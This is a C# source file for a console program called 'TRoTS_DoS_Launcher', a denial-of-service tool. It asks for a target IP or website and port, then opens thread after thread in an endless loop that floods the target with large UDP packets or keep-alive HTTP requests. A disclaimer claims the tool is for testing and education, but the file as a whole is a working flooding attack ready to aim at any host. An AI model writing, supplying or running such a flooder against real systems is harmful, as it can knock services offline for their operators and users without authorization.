using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TRoTS_DoS_Launcher
{
    class Program
    {
        static int packetsSent = 0;

        static void Main(string[] args)
        {
            //Retrieve target information
            Console.WriteLine("Copyright Jeremy Blevins LTD 2017\r\n\r\nDisclaimer: I am not responsible for any illegal activities done using this tool. You are responsible for your own actions. By using this tool, you agree to this Term of Service as a user. If you do not agree to this Term of Service, you are legally required to exit this tool until they are agreed upon. Authorization for this tool is strictly for server penetration testing, and educational purposes only. \r\n\r\nPlease enter an IP address to launch the DoS attack on.");
            string IP = Console.ReadLine();
            int port = 80;

            //If it's a website, don't ask for the port # because it's just doing web requests
            if(!isWebsite(IP)){
                Console.WriteLine("\r\nPlease enter the port you would like to attack on.");
                port = int.Parse(Console.ReadLine());
            }

            //Limit the amount of connections available at once to avoid out of memory exception
            int conns = 0;
            int maxConns = 30000;

            //If it's a website, limit the requests to avoid out of memory exception
            if(isWebsite(IP)){
                maxConns = 800;
            }

            //While there are still connections available
            while (true)
            {
                if(conns < maxConns){
                    new Thread(new ThreadStart(() =>
                    {
                        conns++;

                        //If it's a website, send a web request
                        if(isWebsite(IP)){
                            sendHttpRequest(IP);
                        }
                        else //If it's an IP address, send UDP packets
                        {
                            byte[] buffer = new byte[60000];
                            UdpClient client = new UdpClient();
                            client.Send(buffer, buffer.Length, IP, port);
                        }
                        Console.WriteLine("Attacking " + IP + " on port " + port + " - Packets sent: " + packetsSent + " - Active: " + conns + " Max: " + maxConns);
                        packetsSent++;
                        conns--;
                    })).Start();
                }
            }
        }

        public static void sendHttpRequest(string DDoSURL)
        {
            try
            {
                // Create a request
                if (!DDoSURL.StartsWith("http://") && !DDoSURL.StartsWith("https://"))
                {
                    DDoSURL = "http://" + DDoSURL;
                }
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(DDoSURL);
                // Set the request to keep alive
                request.KeepAlive = true;
                request.Headers.Add("keep-alive", "true");
                // Get Response
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                // Open response stream
                Stream resStream = response.GetResponseStream();
                // Read stream
                string responseData = string.Empty;
                using (StreamReader responseReader = new StreamReader(response.GetResponseStream()))
                {
                    responseData = responseReader.ReadToEnd();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public static bool isWebsite(string str)
        {
            if (str.Split(new string[] {"."}, StringSplitOptions.None).Length > 3 && !str.Contains("www."))
            {
                return false;
            }
            return true;
        }
    }
}
